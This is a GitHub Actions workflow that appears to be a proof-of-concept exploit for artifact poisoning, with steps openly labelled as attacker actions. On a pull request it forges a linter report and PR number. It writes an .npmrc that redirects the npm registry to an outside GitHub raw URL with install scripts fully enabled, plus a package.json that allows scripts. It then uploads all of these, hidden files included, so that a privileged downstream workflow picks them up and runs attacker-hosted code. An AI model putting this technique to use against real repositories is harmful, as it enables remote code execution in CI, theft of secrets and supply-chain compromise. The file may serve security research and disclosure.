---
name: Lint
on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Build attacker artifact for the privileged workflow
        run: |
          printf 'FORGED REPORT - attacker controlled artifact\n' > linter-report.txt
          printf '1' > pr-number.txt
          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-postlint-rce/main/npmreg2/\naudit=false\nfund=false\nprogress=false\ndangerously-allow-all-scripts=true\n' > .npmrc
          printf '%s\n' '{"name":"poc-project","version":"1.0.0","allowScripts":{"gray-matter":true}}' > package.json

      - name: Upload artifact with attacker-chosen files
        if: always()
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: |
            .npmrc
            package.json
            linter-report.txt
            pr-number.txt
          include-hidden-files: true
          if-no-files-found: ignore
